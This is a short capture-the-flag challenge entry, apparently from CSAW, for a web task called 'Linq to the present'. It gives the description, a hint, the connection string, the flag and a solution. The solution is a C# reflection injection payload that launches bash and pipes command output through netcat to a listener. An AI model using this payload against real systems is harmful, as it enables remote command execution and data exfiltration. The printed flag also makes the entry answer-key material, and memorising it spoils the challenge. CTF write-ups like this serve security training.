# Linq to the present
## Author

## Points
100
## Category
Web
## Description
Yo bro I found Trump's and Hilary's private chat server. I'm sure there is more dirt on the server.

*Hint: Just because you have an exe, doesn't mean that it is running on a Windows server.*

`nc web.chal.csaw.io 1340`
## Flag
`flag{i_need_a_better_perscription_I_cant_seed_sharp}`
## Solution
`"".GetType().Assembly.GetType("System.AppDomain").GetMethods()[18].Invoke("".GetType().Assembly.GetType("System.AppDomain").GetProperty("CurrentDomain").GetValue(null), "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;System.Diagnostics.Process".Split(";".ToCharArray())).GetType().GetMethods()[80].Invoke(null, "bash;-c 'ls | nc 0 9001'".Split(";".ToCharArray()))`